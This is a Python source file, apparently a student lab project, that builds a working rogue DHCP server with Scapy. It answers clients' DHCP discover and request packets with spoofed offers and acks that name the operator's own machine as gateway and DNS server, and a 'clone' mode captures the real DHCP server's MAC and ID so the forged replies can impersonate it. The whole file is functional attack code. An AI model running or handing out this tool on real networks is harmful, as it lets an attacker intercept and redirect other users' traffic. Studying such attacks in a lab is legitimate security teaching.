from scapy.all import (
    Scapy_Exception,
    IP, Ether, UDP, BOOTP, DHCP,
    get_if_hwaddr, sniff, sendp, get_if_addr
)

import socket
import argparse
import time
import re
import random

IFACE = "eth0"

def get_broadcast(ipv4, prefix):
    if not isinstance(prefix, int) or not 0 <= prefix <= 32:
        raise ValueError("El prefijo debe estar entre 0 y 32")

    ip_int = 0

    for octeto in (int(x) for x in ipv4.split(".")):
        ip_int = (ip_int << 8) | octeto

    mask_int = (0xFFFFFFFF << (32 - prefix)) & 0xFFFFFFFF
    broadcast_int = ip_int | (~mask_int & 0xFFFFFFFF)

    return ".".join(
        str((broadcast_int >> (8 * i)) & 0xFF)
        for i in range(3, -1, -1)
    )

def prefix_to_netmask(prefix):
    if not isinstance(prefix, int) or not 0 <= prefix <= 32:
        raise ValueError("El prefijo debe estar entre 0 y 32")

    mask_int = (0xFFFFFFFF << (32 - prefix)) & 0xFFFFFFFF

    return ".".join(
        str((mask_int >> (8 * i)) & 0xFF)
        for i in range(3, -1, -1)
    )


def get_my_mac(interface):
    return get_if_hwaddr(interface)

def get_my_ip(interface):
    ip = get_if_addr(interface)
    if ip in (None, "0.0.0.0"):
        raise RuntimeError(f"La interfaz '{interface}' no tiene IPv4 asignada")
    return ip

def crear_args():
    p = argparse.ArgumentParser(description="DHCP spoofing")
    p.add_argument("-r", "--red", required=True, help="IPv4/mask - 192.168.0.67/24")
    p.add_argument("-i", "--iface", default= IFACE)
    p.add_argument("-d", "--duration", type=int, default=10, help="segundos; 0=infinito")
    p.add_argument("-l", "--lease", type=int, default= 86400, help="Segundos que dura el prestamo")
    p.add_argument("-c", "--clone", action="store_true", help="CLona al server  dhcp mediante sniffing")
    return p.parse_args()

def validate_ip(red):
    # solo una barra
    if red.count("/") != 1:
        print(f"[!] '{red}': falta la máscara, usá formato x.x.x.x/x"); return -1
    # tiene que tener si o si 3 puntos
    if red.count(".") != 3:
        print(f"[!] '{red}': no es IPv4 válida (debe tener 4 octetos)"); return -1
    # no puede haber letras
    if re.search("[a-zA-Z]", red):
        print(f"[!] '{red}': contiene letras"); return -1

    mascara_idx = red.index("/")  # busco donde comienza la barra
    try:
        mascara = int(red[mascara_idx + 1 :])  # solo el numero de la mascara
    except ValueError:
        print(f"[!] '{red}': la máscara no es un número"); return -1

    ipv4 = red[:mascara_idx]  # solo la parte de la ip

    # OPTIMIZACIÓN: Separamos los octetos directamente usando split
    try:
        octetos = [int(x) for x in ipv4.split(".")]
    except ValueError:
        # Por si hay puntos consecutivos o formatos extraños como '10..0.1'
        print(f"[!] '{red}': octetos inválidos"); return -1

    # Validamos que los 4 octetos estén en el rango correcto (0-255)
    for octeto in octetos:
        if octeto < 0 or octeto > 255:
            print(f"[!] '{red}': octeto fuera de rango (0-255)"); return -1

    # la mascara no puede ser menor q 0 ni mayor qq 32
    if mascara > 32 or mascara < 0:
            print(f"[!] '{red}': máscara fuera de rango (0-32)"); return -1

    match octetos[0]:
        case 10:
            if mascara < 8:  # CORRECCIÓN: La red de clase A privada (10.0.0.0) empieza en /8
                print(f"[!] '{red}': máscara incoherente para esa clase privada"); return -1
        case 172:
            if octetos[1] < 16 or octetos[1] > 31:  # segundo octeto entre 16-31
                print(f"[!] '{red}': máscara incoherente para esa clase privada"); return -1
            if mascara < 12:  # la mascara no puede ser menor a 12
                print(f"[!] '{red}': máscara incoherente para esa clase privada"); return -1
        case 192:
            if octetos[1] != 168:  # el 2do octeto debe ser 168
                print(f"[!] '{red}': máscara incoherente para esa clase privada"); return -1
            if mascara < 16:  # la mascara no puede ser menor a 16
                print(f"[!] '{red}': máscara incoherente para esa clase privada"); return -1
        case _:  # cualquier otro caso es invalido porque no es privada
                print(f"[!] '{red}': no es una IP privada (RFC1918)"); return -1

    return (ipv4, mascara)

def crear_estado(interface):
    return {
        "clone": False,
        "timeout": None,

        # ─── LO TUYO (atacante) — se llena acá y NADIE lo pisa ───
        "mi_ip":            get_my_ip(interface),   # tu IP real
        "mi_mac":           get_my_mac(interface),  # tu MAC real
        "ip_ofrecida":      None,                   # IP que repartís (la cargás de -r)
        "mascara_ofrecida": None,                   # máscara que repartís
        "lease":            None,                   # duración del préstamo (-l)
        "interface":        None,                   # por dónde mandás
        "mi_xid":           random.randint(1, 0xFFFFFFFF), # mi xid generado al azar

        # ─── LO DEL SERVER (capturado en modo clone) — lo llena get_data ───
        "server_id":        None,                   # IP del server legítimo
        "server_mac":     None,                     # (MAC del server)
        "xid":              None,                   # xid del Offer capturado (sirve en Fase 3)
        "yiaddr":           None,                   # IP que el server ofreció
        "opciones":         {},                     # foto de las opciones del server
    }

def armar_respuesta(pkt, tipo, estado):
    src_mac = estado["server_mac"] if estado["clone"] else estado["mi_mac"]
    id_ip = estado["server_id"] if estado["clone"] else estado["mi_ip"]

    eth_field = Ether(src= src_mac, dst="ff:ff:ff:ff:ff:ff")
    ip_field = IP(src=id_ip, dst="255.255.255.255")
    udp_field = UDP(sport=67, dport=68)
    mac_victima = pkt[Ether].src
    bootp_field = BOOTP(
        op= 2, # 1 request y 2 reply
        xid = pkt[BOOTP].xid,
        yiaddr = estado["ip_ofrecida"],
        siaddr = id_ip,
        chaddr = bytes.fromhex(mac_victima.replace(":", ""))+b'\x00'*10
    )
    message_value = "offer" if tipo == 1 else "ack"
    dhcp_field = DHCP(
        options = [
            ("message-type", message_value),
            ("server_id", id_ip),
            ("lease_time", estado["lease"]),
            ("renewal_time", 43200), # dsp usar args para esto
            ("rebinding_time", 75600), # lo mismo aca
            ("subnet_mask", prefix_to_netmask(estado["mascara_ofrecida"])),
            ("broadcast_address", get_broadcast(estado["ip_ofrecida"], estado["mascara_ofrecida"])),
            ("router", estado["mi_ip"]),
            ("name_server", estado["mi_ip"]),
            "end"
        ]
    )

    sendp(eth_field/ip_field/udp_field/bootp_field/dhcp_field, iface=estado["interface"], verbose=False)

def procesar_pkt(pkt, estado):   # modo INGENUO: escucha al cliente y responde
    if IP in pkt and pkt[IP].src == estado["mi_ip"]:
        return                   # ignoro mis propios paquetes (no me auto-respondo)
    if DHCP not in pkt: return
    opciones = {o[0]: o[1] for o in pkt[DHCP].options if isinstance(o, tuple)}
    tipo = opciones.get("message-type")
    if tipo is None: return
    if tipo in (1, 3):           # 1=discover, 3=request → el cliente pide
        armar_respuesta(pkt, tipo, estado)

def start_sniff(estado):
    try:
        sniff(
            filter="udp and (port 67 or port 68)",
            prn=lambda pkt: procesar_pkt(
                pkt, estado
            ),
            store=False,
            iface=estado["interface"],
            timeout=estado["timeout"]
        )

    except KeyboardInterrupt:
        print("Cerrando programa...")

    except PermissionError:
        print("Error: permisos insuficientes")

    except Scapy_Exception as e:
        print("Error de Scapy:", e)

    except OSError as e:
        print("Error de red:", e)

    except Exception as e:
        print("Error global:", e)

def sniff_netword(args, resultado):

    interface = args.iface
    duration = args.duration


    estado = crear_estado(interface)
    estado["ip_ofrecida"], estado["mascara_ofrecida"] = resultado
    estado["lease"] = args.lease
    estado["interface"] = interface

    estado["timeout"] = duration if duration > 0 else None

    print("[+] Interfaz:", interface)
    print("[+] IP:", estado["mi_ip"])
    print("[+] MAC:", estado["mi_mac"])

    start_sniff(estado)

def get_data(pkt, estado):
    # Guardas de capa: si falta Ether/BOOTP/DHCP, no es lo que buscamos → salgo
    if Ether not in pkt: return
    if BOOTP not in pkt: return
    if DHCP  not in pkt: return

    # Desarmo la lista de opciones DHCP a un dict {nombre: valor} para leerlas cómodo
    opciones = {}
    for opt in pkt[DHCP].options:
        if isinstance(opt, tuple):      # las opciones reales son tuplas; "end"/"pad" no
            nombre, valor = opt
            opciones[nombre] = valor

    # --- Guardo lo capturado del SERVER en estado ---
    estado["xid"]      = pkt[BOOTP].xid       # nº de transacción del Offer
    estado["yiaddr"]   = pkt[BOOTP].yiaddr    # IP que el server ofreció
    estado["opciones"] = opciones             # foto de lo que advertisó el server

    estado["server_mac"] = pkt[Ether].src

    estado["server_id"] = opciones.get("server_id", None)

    estado["opciones"]["router"]      = opciones.get("router", None)
    estado["opciones"]["name_server"] = opciones.get("name_server", None)
    # ℹ️ esto es la foto de lo del server (está BIEN que sean datos del server acá).

    # Print de confirmación (los 5 campos del criterio de la 2.1)
    print("[+] Paquete DHCP analizado")
    print("XID:", estado["xid"])
    print("IP ofrecida:", estado["yiaddr"])
    print("Server ID:", estado["server_id"])
    print("MAC origen:", pkt[Ether].src)
    print("Router: ", estado["opciones"]["router"])
    print("Name server: ", estado["opciones"]["name_server"])
    
def send_discover(estado):
    eth_field = Ether(src= estado["mi_mac"], dst="ff:ff:ff:ff:ff:ff")
    ip_field = IP(src="0.0.0.0", dst="255.255.255.255")
    udp_field = UDP(sport=68, dport=67)
    mac_victima = estado["mi_mac"]
    bootp_field = BOOTP(
        op= 1, # 1 request y 2 reply
        xid = estado["mi_xid"],
        yiaddr = "0.0.0.0",
        siaddr = "0.0.0.0",
        chaddr = bytes.fromhex(mac_victima.replace(":", ""))+b'\x00'*10
    )
    dhcp_field = DHCP(
    options = [
        ("message-type", "discover"),
        ("param_req_list", [1, 3, 6]),
        "end"
        ]
    )
    sendp(eth_field/ip_field/udp_field/bootp_field/dhcp_field, iface=estado["interface"], verbose=False)
    
    
def look_offer(pkt, estado):     # modo CLONE (hoy): escucha al SERVER y captura
    if Ether not in pkt: return
    if IP    not in pkt: return
    if UDP   not in pkt: return
    if BOOTP not in pkt: return
    if DHCP  not in pkt: return
    opciones = {o[0]: o[1] for o in pkt[DHCP].options if isinstance(o, tuple)}
    tipo = opciones.get("message-type")
    if tipo not in (2, 5):       # 2=offer, 5=ack → solo del server
        return
    if estado["mi_xid"] != pkt[BOOTP].xid: # valido q la respuesta sea a mi
        return
    get_data(pkt, estado)        

def stop_sniff(estado):
    if estado["server_mac"]:
        return True
    return False

def main():

    args = crear_args()

    resultado = validate_ip(args.red)

    if resultado == -1:
        return

    if args.clone:
        print("[+] Modo de inspección DHCP")

        interface = args.iface

        try:
            estado = crear_estado(interface)
            estado["ip_ofrecida"], estado["mascara_ofrecida"] = resultado
            estado["lease"] = args.lease
            estado["interface"] = interface
            estado["clone"] = True

            timeout = (
                args.duration
                if args.duration > 0
                else None
            )
            estado["timeout"]=timeout

            sniff(
                filter="udp and (port 67 or port 68)",
                prn=lambda pkt: look_offer(
                    pkt, estado
                ),
                store=False,
                iface=estado["interface"],
                timeout=timeout,
                started_callback= lambda: send_discover(estado),
                stop_filter= lambda pkt :stop_sniff(estado)
            )
        
            if not estado["server_mac"]:
                print("No se pudo clonar")
                return

        except KeyboardInterrupt:
            print("Cerrando programa...")

        except Scapy_Exception as e:
            print("Error de Scapy:", e)

        except OSError as e:
            print("Error de red:", e)

        else:
            start_sniff(estado)

        return



    sniff_netword(args, resultado)


if __name__ == "__main__":
    main()
